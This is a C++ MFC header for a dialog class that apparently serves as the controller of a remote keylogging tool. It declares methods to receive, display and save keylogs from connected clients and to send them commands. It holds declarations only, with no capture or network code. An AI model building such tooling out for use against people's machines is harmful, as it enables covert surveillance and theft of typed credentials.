#pragma once

#include <vector>

#include "CClientSocket.h"
#include "CClientKeylog.h"

#include "definition.h"

const UINT NORMAL_FONT_SIZE = 21;
const UINT NORMAL_COMMAND_DELAY = 120;

// CClient 대화 상자

class CClient : public CDialogEx
{
	DECLARE_DYNAMIC(CClient)

public:
	CClient(int no, CWnd* pParent = nullptr);   // 표준 생성자입니다.
	virtual ~CClient();

// 대화 상자 데이터입니다.
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_DIALOG_CLIENT };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 지원입니다.

	DECLARE_MESSAGE_MAP()
private:
	int m_msg_kind;
	CString m_command;
	std::vector<CClientKeylog*> m_keylogs;
	CTabCtrl m_tab_client_keylog;
public:
	CClientSocket* socket;
	const int no;
public:
	afx_msg void OnClose();
	afx_msg void OnBnClickedButtonSend();
	void ReceiveKeylog(PDUKeylog* pdu);
	void UpdateKeylog(UINT index);
	afx_msg void OnSelchangeTabClientKeylog(NMHDR *pNMHDR, LRESULT *pResult);
	virtual BOOL OnInitDialog();
	CComboBox m_combo_font;
	afx_msg void OnSelchangeComboFont();
	int m_edit_font_size;
	CSpinButtonCtrl m_spin_font_size;
	BOOL m_check_font_italics;
	BOOL m_check_font_bold;
	void UpdateFont();
	LOGFONT m_font;
	afx_msg void OnChangeEditFontSize();
	afx_msg void OnDeltaposSpinFontSize(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnBnClickedCheckFontBold();
	afx_msg void OnBnClickedCheckFontItalics();
	afx_msg void OnClickedRadioMsgKind(UINT uid);
	afx_msg void OnBnClickedCheckUnderlined();
	BOOL m_check_font_underlined;
	BOOL m_check_font_strike;
	afx_msg void OnBnClickedCheckFontStrike();
	UINT m_edit_command_delay;
	afx_msg void OnDeltaposSpinCommandDelay(NMHDR *pNMHDR, LRESULT *pResult);
	void CheckEditsEmpty();
	void CClient::OnBnClickedButtonSaveKeylogs();
	void SaveKeylogs(__time64_t timestamp);
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	void SendCommand();
};
